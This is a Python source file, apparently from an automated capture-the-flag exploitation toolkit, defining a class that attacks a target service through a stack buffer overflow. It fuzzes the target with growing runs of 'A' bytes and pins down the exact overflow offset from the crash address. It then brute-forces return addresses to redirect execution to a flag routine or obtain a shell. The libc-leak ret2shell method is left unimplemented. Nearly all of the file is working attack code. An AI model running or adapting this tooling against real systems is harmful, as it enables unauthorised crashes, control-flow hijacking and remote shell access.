import os
import sys
import re

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
from dispatcher import Dispatcher
from printer import print_colored

class OverflowExploit:
    def __init__(self, config: dict [str, str | bool | int], dispatcher: Dispatcher):
        """
        Initialize the OverflowExploit class.
        :param config: Configuration dictionary
        :param dispatcher: Dispatcher object to handle communication with the target
        :return: None
        """
        self.config = config
        self.dispatcher = dispatcher

        ## Config parsing ##
        self.verbose = config.get("verbose", False)
        self.expected_responses = config.get("expected_responses", [])
        self.flag_format = config.get("flag_format", None)

        self.bof_offset = None

    def try_overflow(self) -> int:
        """
        Attempt to find a buffer overflow by sending increasing sizes of input.
        :return: Size of the buffer that caused the overflow, or -1 if none found
        """
        buffer_size = 16
        while buffer_size <= 2048:
            try:
                if self.verbose:
                    print_colored(f"[+] Trying buffer size: {buffer_size}", 'yellow')

                self.dispatcher.connect()

                command = b"A" * buffer_size

                # Execute the command and check for buffer overflow
                try:
                    return_code = self.dispatcher.send_command(command)
                    if self.verbose:
                        print_colored(f"[+] Return code: {return_code} for size {buffer_size}", 'yellow')
                    if return_code < 0:
                        print_colored(f"[!] Possible buffer overflow detected with size {buffer_size}", 'red')
                        return buffer_size
                    elif return_code == 132:
                        print_colored(f"[!] Illegal instruction detected with size {buffer_size}", 'red')
                        return buffer_size
                except Exception as e:
                    print_colored(f"[!] Possible overflow detected with size {buffer_size}: {e}", 'red')

                if not self.dispatcher.is_connected():
                    print_colored(f"[!] Connection lost after sending size {buffer_size}", 'red')
                    buffer_size *= 2
                    continue
                # Receive the response
                response = self.dispatcher.receive_response()
                if self.verbose:
                    print_colored(f"[+] Received response: {response}", 'yellow')
                if not response:
                    print_colored("[-] No response received.", 'red')
                    print_colored("[!] Possible buffer overflow detected.", 'red')
                    return buffer_size
                if len(self.expected_responses) > 0:
                    if response not in self.expected_responses:
                        print_colored("[-] Unexpected response received.", 'red')
                        print_colored("[!] Possible buffer overflow detected.", 'red')
                        return buffer_size

            except Exception as e:
                print_colored(f"[-] Error during overflow attempt with size {buffer_size}: {e}", 'red')
                return buffer_size
            finally:
                self.dispatcher.close()
            buffer_size *= 2
        return -1

    def adjust_buffer_size(self, size: int) -> int:
        """
        Adjust the buffer size to find the exact overflow offset.
        :param size: Initial buffer size that caused overflow
        :return: Exact offset of the buffer overflow
        """
        if self.verbose:
            print_colored(f"[+] Adjusting buffer size around: {size}", 'yellow')

        # Try sizes from half to double the initial size
        for _size in range(size // 2, size * 2 + 1):

            address_segfault, _ = self.dispatcher.get_segfault(b"A" * _size)

            if self.verbose:
                print_colored(f"[+] Trying buffer size: {_size}, segfault address: {address_segfault}", 'yellow')

            # Check if the segfault address matches the overflow pattern
            if address_segfault != None and address_segfault == "0x41414141":
                print_colored(f"[+] Find the buffer overflow offset: {_size - 4}", 'yellow')
                return _size - 4
        print_colored("[!] No matching segfault address found, using original size.", 'red')
        return -1

    def find_bof_offset(self) -> int:
        """
        Find the buffer overflow offset by attempting to overflow the buffer
        and then adjusting the buffer size to find the exact offset.
        :return: Exact offset of the buffer overflow, or -1 if none found
        """
        buffer_size = self.try_overflow()
        if buffer_size == -1:
            return -1
        self.bof_offset = self.adjust_buffer_size(buffer_size)
        return self.bof_offset

    def find_ret_to_flag(self, address_range: tuple[int,int], shell: bool = False, step:int = 2) -> int:
        """
        Attempt to find a return-to-flag exploit by overwriting the return address
        with addresses in the specified range.
        :param address_range: List containing start and end addresses to try
        :param shell: If the reg to flag is a shell
        :param step: Step size for address iteration
        :return: the address that successfully retrieves the flag, or -1 if none found
        """
        if self.bof_offset is None:
            self.find_bof_offset()
            if self.bof_offset == -1:
                print_colored("[-] Cannot find buffer overflow offset.", 'red')
                return -1

        print_colored(f"[+] Trying return-to-flag exploit in range: {hex(address_range[0])} - {hex(address_range[1])}", 'yellow')

        pattern = re.compile(self.flag_format) if self.flag_format else None
        for addr in range(address_range[0], address_range[1], step):
            try:
                self.dispatcher.connect()

                padding = b"A" * self.bof_offset
                ret_address = addr.to_bytes(4, byteorder='little')
                payload = padding + ret_address

                if self.verbose:
                    print_colored(f"[+] Trying address: {hex(addr)}", 'yellow')

                self.dispatcher.send_command(payload)

                response = self.dispatcher.receive_response()

                self.dispatcher.close()

                # if shell:
                if self.dispatcher.find_shell(payload):
                    print_colored(f"[+] Shell obtained with address {hex(addr)}", 'green')
                    return addr
                    # continue
                if pattern.search(response.decode('utf-8', errors='ignore')) if pattern else response:
                    print_colored(f"[+] Flag found with address {hex(addr)}: {response}", 'green')
                    return addr

            except Exception as e:
                if self.verbose:
                    print_colored(f"[-] Error with address {hex(addr)}: {e}", 'red')
                self.dispatcher.close()

        print_colored("[-] No flag found in the specified address range.", 'red')
        return -1

    def classic_leak_libc_ret2shell(self):
        """
        Attempt a classic libc leak and return-to-shell exploit.
        :return: Address of the shell if successful, or -1 if none found
        """
        if self.dispatcher.client.libc is None:
            print_colored("[-] No libc information available for classic leak.", 'red')
            return -1
        if self.bof_offset is None:
            self.find_bof_offset()
            if self.bof_offset == -1:
                print_colored("[-] Cannot find buffer overflow offset.", 'red')
                return -1

        print_colored("[+] Attempting classic libc leak and ret2shell exploit.", 'yellow')

        # Placeholder for actual libc leak and ret2shell logic
        # This would involve leaking a libc address, calculating offsets,
        # and constructing a payload to execute a shell.

        print_colored("[-] Classic libc leak and ret2shell exploit not implemented.", 'red')
        return -1
